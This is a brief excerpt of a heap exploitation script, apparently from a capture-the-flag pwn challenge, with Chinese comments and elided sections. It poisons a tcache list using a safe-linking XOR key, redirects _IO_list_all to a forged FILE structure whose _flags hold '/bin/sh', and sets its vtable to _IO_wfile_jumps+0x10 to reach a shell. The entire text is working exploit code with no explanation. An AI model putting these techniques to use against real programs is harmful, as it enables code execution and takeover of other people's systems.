...
paste(b'1')
delete(b'9')
add(b'2', 0x60, b'a' * 0x40 + p64(0) + p64(0x31) + p64(io_list_all_addr ^ (key + 1)))
add(b'3', 0x20, b'a')
add(b'3', 0x20, p64(heap_addr + 0x1470))

fake_io_addr = heap_addr + 0x1470  # 伪造的fake_IO结构体的地址
next_chain = 0
fake_IO_FILE = b'/bin/sh\00'  # _flags=rdi
...
fake_IO_FILE += p64(io_wfile_jump_addr + 0x10)  # vtable=IO_wfile_jumps+0x10
